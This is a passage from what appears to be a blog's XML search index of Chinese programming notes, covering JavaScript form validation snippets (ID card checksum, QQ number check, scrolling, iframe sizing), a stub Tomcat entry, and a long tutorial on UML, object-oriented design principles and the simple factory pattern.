65292;&#20598;&#25968;&#20998;&#37197;&#32473;&#22899;&#24615;&#12290;4&#12289;&#26657;&#39564;&#30721;&#35745;&#31639;&#27493;&#39588;(1)&#21313;&#19971;&#20301;&#25968;&#23383;&#26412;&#20307;&#30721;&#21152;&#26435;&#27714;&#21644;&#20844;&#24335;S = Sum(Ai * Wi), i = 0, &#8230; , 16 &#65292;&#20808;&#23545;&#21069; 17 &#20301;&#25968;&#23383;&#30340;&#26435;&#27714;&#21644;Ai&#65306;&#34920;&#31034;&#31532;i&#20301;&#32622;&#19978;&#30340;&#36523;&#20221;&#35777;&#21495;&#30721;&#25968;&#23383;&#20540;(0~9)Wi&#65306;7 9 10 5 8 4 2 1 6 3 7 9 10 5 8 4 2 &#65288;&#34920;&#31034;&#31532; i &#20301;&#32622;&#19978;&#30340;&#21152;&#26435;&#22240;&#23376;&#65289;(2)&#35745;&#31639;&#27169;Y = mod(S, 11)(3)&#26681;&#25454;&#27169;&#65292;&#26597;&#25214;&#24471;&#21040;&#23545;&#24212;&#30340;&#26657;&#39564;&#30721;Y: 0 1 2 3 4 5 6 7 8 9 10&#26657;&#39564;&#30721;: 1 0 X 9 8 7 6 5 4 3 2--&#35828;&#26126;&#65306;1.&#31243;&#24207;&#21487;&#20197;&#26681;&#25454;&#24050;&#26377;&#30340;17&#20301;&#25968;&#23383;&#26412;&#20307;&#30721;&#65292;&#33719;&#21462;&#23545;&#24212;&#30340;&#39564;&#35777;&#30721;&#12290;2.&#35813;&#31243;&#24207;&#21487;&#20197;&#21076;&#38500;&#39564;&#35777;&#30721;&#19981;&#27491;&#30830;&#30340;&#36523;&#20221;&#35777;&#21495;&#30721;&#12290;3.15&#20301;&#30340;&#36523;&#20221;&#35777;&#20986;&#29983;&#24180;&#20221;&#37319;&#29992;&#24180;&#20221;&#21518;2&#20301;&#65292;&#27809;&#26377;&#26368;&#21518;1&#20301;&#26657;&#39564;&#30721;&#12290;4.&#23436;&#25972;&#30340;&#36523;&#20221;&#35777;18&#20301;&#65292;&#26368;&#21518;&#19968;&#20301;&#26657;&#39564;&#20301;&#21487;&#33021;&#26159;&#38750;&#25968;&#23383;&#12290;&#25105;&#20204;&#30340;&#19968;&#20010;&#39033;&#30446;&#65292;&#25968;&#25454;&#24211;&#20445;&#23384;&#21069;17&#20301;&#25968;&#23383;&#65292;&#36825;&#26679;&#23545;&#24212;&#19968;&#20123;SQL&#35821;&#21477;&#65288;&#27604;&#22914;inner join&#65289;&#26377;&#21152;&#36895;&#20316;&#29992;&#30340;&#65281;&#65281;&#65281;6.3 电话号码校验6.4 Email校验6.5 IP地址校验6.6 其他校验6.6.1 检查QQ号码#+BEGIN_SRC emacs-lisp                                                                                                                                function checkqq()  //检查QQ号码                                                                                                                      {                                                                                                                                                             var qq=document.getElementById("qq").value;                                                                                                           var divqq=document.getElementById("qq");                                                                                                              if(qq!="")                                                                                                                                            {                                                                                                                                                             if(qq.match(\D)!=null)                                                                                                                              {                                                                                                                                                             divqq.innerHTML="&lt;font color='red'&gt;QQ号码只能输入数字！&lt;/font&gt;";                                                                                      return false;                                                                                                                                 }                                                                                                                                                     else                                                                                                                                                  {                                                                                                                                                            divqq.innerHTML="&lt;font color='red'&gt;√&lt;/font&gt;";                                                                                                        return true;                                                                                                                                  }                                                                                                                                             }                                                                                                                                                     else                                                                                                                                                  {                                                                                                                                                            divqq.innerHTML="&lt;font color='green'&gt;√&lt;/font&gt;";                                                                                                      return true;                                                                                                                                  }                                                                                                                                             }                                                                                                                                                     #END_SRC6.6.2 7 其他7.0.1 滚动到页面顶部function goTopEx() {    var obj = document.getElementById("goTopBtn");    function getScrollTop() {        return document.documentElement.scrollTop;    }    function setScrollTop(value) {        document.documentElement.scrollTop = value;    }    window.onscroll = function () { getScrollTop() &gt; 0 ? obj.style.display = "" : obj.style.display = "none"; }    obj.onclick = function () {        var goTop = setInterval(scrollMove, 10);        function scrollMove() {            setScrollTop(getScrollTop() / 1.1);            if (getScrollTop() &lt; 1) clearInterval(goTop);        }    }}8 页面操作8.1 根据网页实际大小来设置iframe显示区域大小$('#iframe_i').load(function () {                                                                                                                     // &#8220;ref_page&#8221;&#20026;&#24341;&#29992;&#39029;&#38754;DIV&#30340;ID&#65292;&#33719;&#21462;DIV&#30340;&#22806;&#37096;&#23485;&#24230;&#12289;&#22806;&#37096;&#39640;&#24230;&#12290;                                                                                      var width = $(this).contents().find('#ref_page').outerWidth();                                                                                       var height = $(this).contents().find('#ref_page').outerHeight();                                                                                     // &#35774;&#32622;iframe&#30340;&#23485;&#24230;&#12289;&#39640;&#24230;&#12290;                                                                                                                          $(this).width(width);                                                                                                                                $(this).height(height);                                                                                                                             )};                                                                                                                                                  8.2 动态显示收缩列表Method 1:$(document).ready(function(){                                                                                                                         //&#24403;&#28857;&#20987;&#26576;&#19968;&#21015;&#34920;&#39033;&#26102;&#65292;&#28369;&#20986;&#19979;&#32423;&#33756;&#21333;&#24182;&#25910;&#36215;&#20854;&#20182;&#21015;&#34920;&#39033;                                                                                                   $("#user_manage").click(function(){                                                                                                                   // $("#user_about").fadeToggle();                                                                                                                    $("#user_manage").addClass("active");                                                                                                                $("#node_manage").removeClass("active");                                                                                                             $("#role_manage").removeClass("active");                                                                                                             $("#setting").removeClass("active");                                                                                                                 $("#user_about").slideToggle();                                                                                                                      $("#node_about").slideUp();                                                                                                                          $("#role_about").slideUp();                                                                                                                             /*$("#div2").fadeToggle("slow");                                                                                                                         $("#div3").fadeToggle(3000);*/                                                                                                               });                                                                                                                                                 });                                                                                                                                                  Method 2:http://jqueryui.com/accordion/                                                                                                                        ]]></content>
      <categories>
        
          <category> javascript </category>
        
      </categories>
      <tags>
        
          <tag> JavaScript </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Tomcat]]></title>
      <url>/software/web-server/2015/09/23/tomcat/</url>
      <content type="text"><![CDATA[1 Tomcat 简介2 ReferencesTomcat 百度百科]]></content>
      <categories>
        
          <category> software </category>
        
          <category> web-server </category>
        
      </categories>
      <tags>
        
          <tag> Tomcat </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[设计模式]]></title>
      <url>/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2015/08/20/design-pattern/</url>
      <content type="text"><![CDATA[1 简介1.1 设计模式的定义设计模式(Design Pattern)是一套被反复使用、多数人知晓的、经过分类编目的、代码设计经验的总结，使用设计模式是为了可重用代码、让代码更容易被他人理解、保证代码可靠性。1.2 设计模式的基本要素模式名称(Pattern name)问题(Problem)解决方案(Solution)效果(Consequences)1.3 GoF设计模式简介Table 1: GoF 23种模式一览表范围\目的创建型模式结构性模式行为型模式类模式工厂方法模式（类）适配器模式解释器模式&#xa0;&#xa0;&#xa0;模板方法模式对象模式抽象工厂模式（对象）适配器模式职责链模式&#xa0;建造者桥接模式命令模式&#xa0;原型模式组合模式迭代器模式&#xa0;单例模式装饰模式中介者模式&#xa0;&#xa0;外观模式备忘录模式&#xa0;&#xa0;享元模式观察者模式&#xa0;&#xa0;代理模式状态模式&#xa0;&#xa0;&#xa0;策略模式&#xa0;&#xa0;&#xa0;访问者模式参考: 《设计模式:可复用面向对象软件的基础》2 统一建模语言基础知识2.1 UML简介统一建模语言(Unified Modeling Language，UML)是一种可视化的标准建模语言，它是一种分析和设计语言，通过UML可以构造软件系统的蓝图。2.1.1 UML 的诞生在一个现代化的工程中，人们要相互沟通和合作，就必须使用标准的工业化设计语言，用这些语言来对待开发的产品进行建模。建模过程把复杂的问题分解成为易于理解的小问题，以达到问题的求解。建模是开发优秀软件的所有活动中核心部分之一，其目的是把所要设计的结构和系统的行为联系起来，并对系统的结构进行可视化控制。2.1.2 UML 的结构1. 视图(View)用户视图：以用户的观点表示系统的目标，它是所有视图的核心，该视图描述系统的需求。结构视图：表示系统的静态行为，描述系统的静态元素，如包、类与对象，以及它们之间的关系。行为视图：表示系统的动态行为，描述系统的组成元素如对象在系统运行时的交互关系。实现视图：表示系统中逻辑元素的分布，描述系统中物理文件以及它们之间的关系。环境视图：表示系统中物理元素的分布，描述系统中硬件设备以及它们之间的关系。2. 图(Diagram)用例图(Use Case Diagram):又称为用况图，对应于用户视图。在用例图中，使用用例来表示系统的功能需求，用例图用于表示多个外部执行者与系统用例之间以及用例与用例之间的关系。用例图与用例说明文档(Use Case Specification)是常用的需求建模工具，也称之为用例建模。类图(Class Diagram)：对应于结构视图。类图使用类来描述系统的静态结构，类图包含类和它们之间的关系，它描述系统内所声明的类，但它没有描述系统运行时类的行为。对象图(Object Diagram)：对应于结构视图。对象图是类图在某一时刻的一个实例，用于表示类的对象实例之间的关系。包图(Package Diagram)：UML2.0新增图，对应于结构视图。包图用于描述包与包之间的关系，包是一种把元素组织到一起的通用机制，如可以将多个类组织成一个包。组合结构图(Composite Structure Diagram)：UML2.0新增图，对应于结构视图。组合结构图将每一个类放在一个整体中，从类的内部结构来审视一个类。组合结构图可用于表示一个类的内部结构，用于描述一些包含复杂成员或内部类的类结构。状态图(State Diagram)：对应于行为视图。状态图用来描述一个特定对象的所有可能状态及其引起状态转移的事件。一个状态图包括一系列对象的状态及状态之间的转换。活动图(Activity Diagram)：对应于行为视图。活动图用来表示系统中各种活动的次序，它的应用非常广泛，既可用来描述用例的工作流程，也可以用来描述类中某个方法的操作行为。顺序图(Sequence Diagram)：又称为时序图或序列图，对应于行为视图。顺序图用于表示对象之间的交互，重点表示对象之间发送消息的时间顺序。通信图(Communication Diagram)：在UML1.x中称为协作图，对应于行为视图。通信图展示了一组对象、这些对象间的连接以及它们之间收发的消息。它与顺序图是同构图，也就是它们包含了相同的信息，只是表达方式不同而已，通信图与顺序图可以相互转换。定时图(Timing Diagram)：UML2.0新增图，对应于行为视图。定时图采用一种带数字刻度的时间轴来精确地描述消息的顺序，而不是像顺序图那样只是指定消息的相对顺序，而且它还允许可视化地表示每条生命线的状态变化，当需要对实时事件进行定义时，定时图可以很好地满足要求。交互概览图(Interaction Overview Diagram)：UML2.0新增图，对应于行为视图。交互概览图是交互图与活动图的混合物，可以把交互概览图理解为细化的活动图，在其中的活动都通过一些小型的顺序图来表示；也可以将其理解为利用标明控制流的活动图分解过的顺序图。组件图(Component Diagram)：又称为构件图，对应于实现视图。组件图用于描述每个功能所在的组件位置以及它们之间的关系。部署图(Deployment Diagram)：又称为实施图，对应于环境视图。部署图用于描述软件中各个组件驻留的硬件位置以及这些硬件之间的交互关系。在 UML 中，顺序图、通信图、定时图和交互概览图又统称交互图(Interactive Diagram)，交互图是表示各对象如何依据某种行为进行协作的模型，通常可以使用一个交互图来表示和说明一个用例的行为。3. 模型元素(Model element)在UML中，模型元素包括事物以及事物与事物之间的联系。事物是UML的重要组成部分，它代表任何可以定义的东西。事物之间的关系把事物联系在一起，组成有意义的结构模型。每一个模型元素都有一个与之相对应的图形元素。同一个模型元素可以在不同的UML图中使用，但是，无论在哪个图中，同一个模型元素都保持相同的意义和符号。4. 通用机制(General mechanism)UML提供的通用机制为模型元素提供额外的注释、修饰和语义等，主要包括规格说明、修饰、公共分类和扩展机制四种。扩展机制允许用户对UML进行扩展，以便一个特定的方法、过程、组织或用户来使用。2.1.3 UML 的特点工程化规范化可视化系统化文档化智能化2.2 类图2.2.1 类与类图类(Class)封装了数据和行为，是面向对象的重要组成部分，它是具有相同属性、操作、关系的对象集合的总称。在系统中，每个类具有一定的职责，职责指的是类所担任的任务，即类要完成什么样的功能，要承担什么样的义务。一个类可以有多种职责，设计得好的类一般只有一种职责，在定义类的时候，将类的职责分解成为类的属性和操作（即方法）。类的属性即类的数据职责，类的操作即类的行为职责。在UML类图中，类一般由三部分组成：类名：每个类都必须有一个名字，类名是一个字符串。属性(Attributes)：属性是指类的性质，即类的成员变量。类可以有任意多个属性，也可以没有属性。操作(Operations)：操作是类的任意一个实例对象都可以使用的行为，操作是类的成员方法。2.2.2 类之间的关系关联关系关联关系(Association)是类与类之间最常用的一种关系，它是一种结构化关系，用于表示一类对象与另一类对象之间有联系。在UML类图中，用实线连接有关联的对象所对应的类，在使用Java、C#和C++等编程语言实现关联关系时，通常将一个类的对象作为另一个类的属性。在使用类图表示关联关系时可以在关联线上标注角色名。1. 双向关联2. 单向关联3. 自关联4. 重数性关联：	重数性关联关系又称为多重性关联关系(Multiplicity)，表示一个类的对象与另一个类的对象连接的个数。在UML中多重性关系可以直接在关联直线上增加一个数字表示与之对应的另一个类的对象的个数。5. 聚合关系：	聚合关系(Aggregation)表示一个整体与部分的关系。通常在定义一个整体类后，再去分析这个整体类的组成结构，从而找出一些成员类，该整体类和成员类之间就形成了聚合关系。	在聚合关系中，成员类是整体类的一部分，即成员对象是整体对象的一部分，但是成员对象可以脱离整体对象独立存在。在UML中，聚合关系用带空心菱形的直线表示。6. 组合关系：	组合关系(Composition)也表示类之间整体和部分的关系，但是组合关系中部分和整体具有统一的生存期。一旦整体对象不存在，部分对象也将不存在，部分对象与整体对象之间具有同生共死的关系。	在组合关系中，成员类是整体类的一部分，而且整体类可以控制成员类的生命周期，即成员类的存在依赖于整体类。在UML中，组合关系用带实心菱形的直线表示。7. 依赖关系：	依赖关系(Dependency)是一种使用关系，特定事物的改变有可能会影响到使用该事物的其他事物，在需要表示一个事物使用另一个事物时使用依赖关系。大多数情况下，依赖关系体现在某个类的方法使用另一个类的对象作为参数。	在UML中，依赖关系用带箭头的虚线表示，由依赖的一方指向被依赖的一方。8. 范化关系：	泛化关系(Generalization)也就是继承关系，也称为“is-a-kind-of”关系，泛化关系用于描述父类与子类之间的关系，父类又称作基类或超类，子类又称作派生类。在UML中，泛化关系用带空心三角形的直线来表示。	在代码实现时，使用面向对象的继承机制来实现泛化关系，如在Java语言中使用extends关键字、在C++/C#中使用冒号“：”来实现。9. 接口与实现关系：	接口之间也可以有与类之间关系类似的继承关系和依赖关系，但是接口和类之间还存在一种实现关系(Realization)，在这种关系中，类实现了接口，类中的操作实现了接口中所声明的操作。在UML中，类与接口之间的实现关系用带空心三角形的虚线来表示。实例说明：某基于Java语言的C/S软件需要提供注册功能，该功能简要描述如下：用户通过注册界面(RegisterForm)输入个人信息，用户点击“注册”按钮后将输入的信息通过一个封装用户输入数据的对象(UserDTO)传递给操作数据库的数据访问类(DAO)，为了提高系统的扩展性，针对不同的数据库可能需要提供不同的数据访问类，因此提供了数据访问类接口，如IUserDAO，每一个具体数据访问类都是某一个数据访问类接口的实现类，如OracleUserDAO就是一个专门用于访问Oracle数据库的数据访问类。根据以上描述绘制类图。为了简化类图，个人信息仅包括账号(userAccount)和密码(userPassword)，且界面类无须涉及界面细节元素。注释(Comment)2.3 顺序图顺序图是最常用的系统动态建模工具之一，也是使用频率最高的交互图。它用于表示对象之间的动态交互，而且以图形化的方式描述了对象间消息传递的时间顺序。2.3.1 定义顺序图(Sequence Diagram)是一种强调对象间消息传递次序的交互图，又称为时序图或序列图。顺序图以图形化的方式描述了在一个用例或操作的执行过程中对象如何通过消息相互交互，说明了消息如何在对象之间被发送和接收以及发送的顺序。顺序图允许直观地表示出对象的生存期，在生存期内，对象可以对输入消息做出响应，还可以发送信息。在软件系统建模中，顺序图的使用很灵活，通常包括如下两种顺序图：需求分析阶段的顺序图：主要用于描述用例中对象之间的交互，可以使用自然语言来绘制，用于细化需求，它从业务的角度进行建模，用描述性的文字叙述消息的内容。系统设计阶段的顺序图：确切表示系统设计中对象之间的交互，考虑到具体的系统实现，对象之间通过方法调用传递消息。2.3.2 顺序图组成元素在UML中，顺序图将交互关系表示为一个二维图，纵向是时间轴，时间沿竖线向下延伸；横向轴表示了在交互过程中的独立对象，对象的活动用生命线表示。顺序图由执行者(Actor)、生命线(Lifeline)、对象(Object)、激活框(Activation)和消息(Message)等元素组成。2.3.3 实例说明某基于Java EE的B/S系统需要提供登录功能，该功能简要描述如下：用户打开登录界面login.jsp输入数据，向系统提交请求，系统通过Servlet获取请求数据，将数据传递给业务对象，业务对象接收数据后再将数据传递给数据访问对象，数据访问对象对数据库进行操作，查询用户信息，再返回查询结果。根据以上描述绘制顺序图。2.4 状态图状态图用于描述对象的各种状态以及状态之间的转换。2.4.1 定义状态图(Statechart Diagram)用来描述一个特定对象的所有可能状态及其引起状态转移的事件。一个状态图包括一系列的状态及状态之间的转移。大多数面向对象技术都使用状态图来描述一个对象在其生命周期中的行为，对象从产生到结束，可以处于一系列不同的状态。状态影响对象的行为，当这些状态的数目有限时，就可以用状态图来建模对象的行为，状态图显示了单个类的生命周期，在不同状态下对象可能具有不同的行为。状态图适用于描述在不同用例之间的对象行为，但并不适合于描述包括若干协作的对象行为，因为一个状态图只能用于描述一个类的对象状态，如果涉及到多个不同类的对象，则需要使用活动图。2.4.2 状态图组成元素状态(State)：又称为中间状态，用圆角矩形框表示，在一个状态图中可有多个状态，每个状态包含两格：上格放置状态名称，下格说明处于该状态时对象可以进行的活动(Action)。初始状态(Initial State)：又称为初态，用一个黑色的实心圆圈表示，在一个状态图中只能够有一个初始状态。结束状态(Final State)：又称为终止状态或终态，用一个实心圆外加一个圆圈表示，在一个状态图中可能有多个结束状态。转移(Transition)：用从一个状态到另一个状态之间的连线和箭头说明状态的转移情况，并用文字说明引发这个状态变化的相应事件是什么。事件有可能在特定的条件下发生，在UML中这样的条件称为守护条件(Guard Condition)，发生事件时的处理也称为动作(Action)。状态之间的转移可带有标注，由三部分组成（每一部分都可省略），其语法为：事件名 [条件] / 动作名。在一个状态图中，一个状态也可以被细分为多个子状态，包含多个子状态的状态称为复合状态。2.4.3 实例说明某信用卡系统账户具有使用状态和冻结状态，其中使用状态又包括正常状态和透支状态两种子状态。如果账户余额小于零则进入透支状态，透支状态时既可以存款又可以取款，但是透支金额不能超过5000元；如果余额大于零则进入正常状态，正常状态时既可以存款又可以取款；如果连续透支100天，则进入冻结状态，冻结状态下既不能存款又不能取款，必须要求银行工作人员解冻。用户可以在使用状态或冻结状态下请求注销账户。根据上述要求，绘制账户类的状态图。2.5 小结UML是一种分析设计语言，即一种建模语言。UML是由图形符号表达的建模语言，其结构主要包括视图、图、模型元素和通用机制四部分。UML包括5种视图，分别是用户视图、结构视图、行为视图、实现视图和环境视图。在UML2.0中，提供了13种图，分别是用例图、类图、对象图、包图、组合结构图、状态图、活动图、顺序图、通信图、定时图、交互概览图、组件图和部署图。UML已成为用于描绘软件蓝图的标准语言，它可用于对软件密集型系统进行建模，其主要特点包括：工程化、规范化、可视化、系统化、文档化和智能化。类图使用出现在系统中的不同类来描述系统的静态结构，类图用来描述不同的类和它们的关系。在UML中，类之间的关系包括关联关系、依赖关系、泛化关系和实现关系，其中关联关系又包括双向关联、单向关联、自关联、重数性关联、聚合关系和组合关系。顺序图是一种强调对象间消息传递次序的交互图，又称为时序图或序列图。顺序图以图形化的方式描述了在一个用例或操作的执行过程中对象如何通过消息相互交互，说明了消息如何在对象之间被发送和接收以及发送的顺序。顺序图允许直观地表示出对象的生存期，在生存期内，对象可以对输入消息做出响应，还可以发送信息。顺序图由执行者、生命线、对象、激活框、消息和交互片段等元素组成。状态图用来描述一个特定对象的所有可能状态及其引起状态转移的事件。我们通常用状态图来描述单个对象的行为，它确定了由事件序列引出的状态序列，一个状态图包括一系列的状态及状态之间的转移。状态图由状态、初始状态、结束状态和转移等元素组成。在一个状态图中，一个状态也可以被细分为多个子状态，包含多个子状态的状态称为复合状态。3 面向对象设计原则3.1 面向对象设计原则概述3.1.1 软件的可维护性和可复用性1. 知名软件大师Robert C.Martin认为一个可维护性(Maintainability) 较低的软件设计，通常由于如下4个原因造成：过于僵硬(Rigidity)过于脆弱(Fragility)复用率低(Immobility)黏度过高(Viscosity)2. 软件工程和建模大师Peter Coad认为，一个好的系统设计应该具备如下三个性质：可扩展性(Extensibility)灵活性(Flexibility)可插入性(Pluggability)3. 重构(Refactoring)是在不改变软件现有功能的基础上，通过调整程序代码改善软件的质量、性能，使其程序的设计模式和架构更趋合理，提高软件的扩展性和维护性3.1.2 面向对象设计原则简介常用的面向对象设计原则包括7个，这些原则并不是孤立存在的，它们相互依赖，相互补充。设计原则名称设计原则简介重要性单一职责原则类的职责要单一，不能将太多的职责放在一个类中★★★★☆(Single Responsibility Principle, SRP)&#xa0;&#xa0;开闭原则软件实体对扩展是开放的，但对修改是关闭的，即在不修改一个★★★★★(Open-Closed Principle, OCP)软件实体的基础上去扩展其功能&#xa0;里氏代换原则在软件系统中，一个可以接受基类对象的地方必然可以接受一个★★★★☆(Liskov Substitution Principle, LSP)个子类对象&#xa0;依赖倒转原则要针对抽象层编程，而不要针对具体类编程★★★★★(Dependency Inversion Principle, DIP)&#xa0;&#xa0;接口隔离原则使用多个专门的接口来取代一个统一的接口★★☆☆☆(Interface Segregation Principle, ISP)&#xa0;&#xa0;合成复用原则在系统中应该尽量多使用组合和聚合关联关系，尽量少使用甚至★★★★☆(Composite Reuse Principle, CRP)不使用继承关系&#xa0;迪米特法则一个软件实体对其他实体的引用越少越好，或者说如果两个类不★★★☆☆(Law of Demeter, LoD)必彼此直接通信，那么这两个类就不应当发生直接的相互作用，&#xa0;&#xa0;而是通过引入一个第三者发生间接交互&#xa0;3.2 单一职责原则3.2.1 定义一个对象应该只包含单一的职责，并且该职责被完整地封装在一个类中。Every object should have a single responsibility, and that responsibility should be entirely encapsulated by the class.就一个类而言，应该仅有一个引起它变化的原因。There should never be more than one reason for a class to change.3.2.2 分析一个类（或者大到模块，小到方法）承担的职责越多，它被复用的可能性越小类的职责主要包括两个方面：数据职责和行为职责，数据职责通过其属性来体现，而行为职责通过其方法来体现。单一职责原则是实现高内聚、低耦合的指导方针，在很多代码重构手法中都能找到它的存在，它是最简单但又最难运用的原则，需要设计人员发现类的不同职责并将其分离，而发现类的多重职责需要设计人员具有较强的分析设计能力和相关重构经验。3.2.3 实例3.3 开闭原则3.3.1 定义一个软件实体应当对扩展开放，对修改关闭。也就是说在设计一个模块的时候，应当使这个模块可以在不被修改的前提下被扩展，即实现在不修改源代码的情况下改变这个模块的行为。Software entities should be open for extension, but closed for modification.3.3.2 分析软件实体可以指一个软件模块、一个由多个类组成的局部结构或一个独立的类。抽象化是开闭原则的关键。 开闭原则还可以通过一个更加具体的“对可变性封装原则”来描述，对可变性封装原则(Principle of Encapsulation of Variation, EVP)要求找到系统的可变因素并将其封装起来。 3.3.3 实例某图形界面系统提供了各种不同形状的按钮，客户端代码可针对这些按钮进行编程，用户可能会改变需求要求使用不同的按钮。3.4 里氏代换原则3.4.1 定义如果对每一个类型为S的对象o1，都有类型为T的对象o2，使得以T定义的所有程序P在所有的对象o1都代换成o2时，程序P的行为没有变化，那么类型S是类型T的子类型。If for each object o1 of type S there is an object o2 of type T such that for all programs P defined in terms of T, the behavior of P is unchanged when o1 is substituted for o2 then S is a subtype of T.所有引用基类（父类）的地方必须能透明地使用其子类的对象。Functions that use pointers or references to base classes must be able to use objects of derived classes without knowing it.3.4.2 分析在软件中如果能够使用基类对象，那么一定能够使用其子类对象。把基类都替换成它的子类，程序将不会产生任何错误和异常，反过来则不成立，如果一个软件实体使用的是一个子类的话，那么它不一定能够使用基类。在程序中尽量使用基类类型来对对象进行定义，而在运行时再确定其子类类型，用子类对象来替换父类对象。3.4.3 实例3.5 依赖倒转原则3.5.1 定义高层模块不应该依赖低层模块，它们都应该依赖抽象。抽象不应该依赖于细节，细节应该依赖于抽象。High level modules should not depend upon low level modules, both should depend upon abstractions. Abstractions should not depend upon details, details should depend upon abstractions.要针对接口编程，不要针对实现编程。Program to an interface, not an implementation.3.5.2 分析1. 代码要依赖于抽象的类，而不要依赖于具体的类；要针对接口或抽象类编程，而不是针对具体类编程。2. 如果说开闭原则是面向对象设计的目标的话，那么依赖倒转原则就是面向对象设计的主要手段。3.类之间的耦合&gt; 零耦合关系 &gt; 具体耦合关系 &gt; 抽象耦合关系依赖倒转原则要求客户端依赖于抽象耦合，以抽象方式耦合是依赖倒转原则的关键。3. 依赖注入构造注入(Constructor Injection)：通过构造函数注入实例变量。 设值注入(Setter Injection)：通过Setter方法注入实例变量。 接口注入(Interface Injection)：通过接口方法注入实例变量。3.5.3 实例某系统提供一个数据转换模块，可以将来自不同数据源的数据转换成多种格式，如可以转换来自数据库的数据(DatabaseSource)、也可以转换来自文本文件的数据(TextSource)，转换后的格式可以是XML文件(XMLTransformer)、也可以是XLS文件(XLSTransformer)等。由于需求的变化，该系统可能需要增加新的数据源或者新的文件格式，每增加一个新的类型的数据源或者新的类型的文件格式，客户类MainClass都需要修改源代码，以便使用新的类，但违背了开闭原则。现使用依赖倒转原则对其进行重构。 3.6 接口隔离原则3.6.1 定义3.6.2 分析3.6.3 实例3.7 合成复用原则3.7.1 定义3.7.2 分析3.7.3 实例3.8 迪米特法则3.8.1 定义3.8.2 分析3.8.3 实例4 创建型模式4.1 介绍创建型模式(Creational Pattern)对类的实例化过程进行了抽象，能够将软件模块中对象的创建和对象的使用分离。为了使软件的结构更加清晰，外界对于这些对象只需要知道它们共同的接口，而不清楚其具体的实现细节，使整个系统的设计更加符合单一职责原则。创建型模式在创建什么(What)，由谁创建(Who)，何时创建(When)等方面都为软件设计者提供了尽可能大的灵活性。创建型模式隐藏了类的实例的创建细节，通过隐藏对象如何被创建和组合在一起达到使整个系统独立的目的。4.2 创建型模式有哪些？&#31616;&#21333;&#24037;&#21378;&#27169;&#24335;&#65288;Simple Factory&#65289;&#37325;&#35201;&#31243;&#24230;&#65306;4 &#65288;5&#20026;&#28385;&#20998;&#65289;&#24037;&#21378;&#26041;&#27861;&#27169;&#24335;&#65288;Factory Method&#65289;&#37325;&#35201;&#31243;&#24230;&#65306;5&#25277;&#35937;&#24037;&#21378;&#27169;&#24335;&#65288;Abstract Factory&#65289;&#37325;&#35201;&#31243;&#24230;&#65306;5&#24314;&#36896;&#32773;&#27169;&#24335;&#65288;Builder&#65289;&#37325;&#35201;&#31243;&#24230;&#65306;2&#21407;&#22411;&#27169;&#24335;&#65288;Prototype&#65289;&#37325;&#35201;&#31243;&#24230;&#65306;3&#21333;&#20363;&#27169;&#24335;&#65288;Singleton&#65289;&#37325;&#35201;&#31243;&#24230;&#65306;44.3 简单工厂模式4.3.1 模式定义&#31616;&#21333;&#24037;&#21378;&#27169;&#24335;(Simple Factory Pattern)&#65306;&#21448;&#31216;&#20026;&#38745;&#24577;&#24037;&#21378;&#26041;&#27861;(Static Factory Method)&#27169;&#24335;&#65292;&#23427;&#23646;&#20110;&#31867;&#21019;&#24314;&#22411;&#27169;&#24335;&#12290;&#22312;&#31616;&#21333;&#24037;&#21378;&#27169;&#24335;&#20013;&#65292;&#21487;&#20197;&#26681;&#25454;&#21442;&#25968;&#30340;&#19981;&#21516;&#36820;&#22238;&#19981;&#21516;&#31867;&#30340;&#23454;&#20363;&#12290;&#31616;&#21333;&#24037;&#21378;&#27169;&#24335;&#19987;&#38376;&#23450;&#20041;&#19968;&#20010;&#31867;&#26469;&#36127;&#36131;&#21019;&#24314;&#20854;&#20182;&#31867;&#30340;&#23454;&#20363;&#65292;&#34987;&#21019;&#24314;&#30340;&#23454;&#20363;&#36890;&#24120;&#37117;&#20855;&#26377;&#20849;&#21516;&#30340;&#29238;&#31867;&#12290;4.3.2 举例说明/** * &#31616;&#21333;&#24037;&#21378;&#27169;&#24335;&#65288;Simple Factory Pattern&#65289;&#24212;&#29992;&#20030;&#20363;&#65306;&#22810;&#31181;&#25903;&#20184;&#26041;&#24335;&#12290; */// 1.&#25277;&#35937;&#25903;&#20184;&#26041;&#27861;&#31867;public abstract class AbstractPay{        public abstract void pay();}// 2.&#25903;&#20184;&#26041;&#24335;&#31867;// &#29616;&#37329;&#25903;&#20184;&#31867;public class CashPay extends AbstractPay{        public void pay(){                // &#29616;&#37329;&#25903;&#20184;&#22788;&#29702;&#20195;&#30721;        }}// &#20449;&#29992;&#21345;&#25903;&#20184;&#31867;public class CreditcardPay extends AbstractPay{        public void pay(){                // &#20449;&#29992;&#21345;&#25903;&#20184;&#22788;&#29702;&#20195;&#30721;        }}// 3.&#25903;&#20184;&#26041;&#24335;&#24037;&#21378;&#31867;public class PayMethodFactory{        public static AbstractPay getPayMethod(String type){                if (type.equalsIgnoreCase("cash")) {                        return new CashPay(); // &#26681;&#25454;&#21442;&#25968;&#21019;&#24314;&#20855;&#20307;&#20135;&#21697;                }else if (type.equalsIgnoreCase("creditcard")) {                        return new CreditcardPay(); // &#26681;&#25454;&#21442;&#25968;&#21019;&#24314;&#20855;&#20307;&#20135;&#21697;                }else{                        // ...                }        }}4.3.3 模式分析1.&#24847;&#20041;&#65306;1)&#23558;&#23545;&#35937;&#30340;&#21019;&#24314;&#21644;&#23545;&#35937;&#26412;&#36523;&#19994;&#21153;&#22788;&#29702;&#20998;&#31163;&#21487;&#20197;&#38477;&#20302;&#31995;&#32479;&#30340;&#32806;&#21512;&#24230;&#65292;&#20351;&#24471;&#20004;&#32773;&#20462;&#25913;&#36215;&#26469;&#37117;&#30456;&#23545;&#23481;&#26131;&#12290;2)&#20351;&#29992;&#31616;&#21333;&#24037;&#21378;&#27169;&#24335;&#21518;&#65292;&#31995;&#32479;&#20013;&#31867;&#30340;&#20010;&#25968;&#22686;&#21152;&#65292;&#27599;&#19968;&#31181;&#25903;&#20184;&#22788;&#29702;&#26041;&#24335;&#37117;&#23553;&#35013;&#21040;&#21333;&#29420;&#30340;&#27169;&#24335;&#20013;&#65292;&#32780;&#19988;&#24037;&#21378;&#31867;&#20013;&#21482;&#26377;&#31616;&#21333;&#30340;&#21028;&#26029;&#36923;&#36753;&#20195;&#30721;&#65292;&#19981;&#38656;&#35201;&#20851;&#24515;&#20855;&#20307;&#30340;&#19994;&#21153;&#22788;&#29702;&#36807;&#31243;&#65292;&#28385;&#36275;&#8220;&#21333;&#19968;&#32844;&#